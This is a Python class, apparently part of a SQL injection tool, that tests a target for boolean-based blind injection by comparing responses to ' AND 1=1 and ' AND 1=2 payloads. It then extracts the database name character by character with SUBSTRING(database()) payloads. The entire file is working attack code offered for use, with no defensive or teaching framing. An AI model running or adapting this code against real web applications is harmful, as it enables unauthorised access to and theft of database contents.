class BooleanBased:
    def __init__(self, req, parser, logger, args):
        self.req = req
        self.parser = parser
        self.logger = logger
        self.args = args

    def run(self):
        t = self.req.get_text("' AND 1=1-- -")
        f = self.req.get_text("' AND 1=2-- -")
        if t != f:
            self.logger.success("Boolean-based work")
            self._extract()
        else:
            self.logger.info("Boolean-based tidak work")

    def _extract(self):
        chars = "abcdefghijklmnopqrstuvwxyz0123456789_"
        result = ""
        for pos in range(1, 31):
            for c in chars:
                p = f"' AND SUBSTRING(database(),{pos},1)='{c}'-- -"
                if "error" not in self.req.get_text(p).lower():
                    result += c
                    break
        self.logger.success(f"Database: {result}")
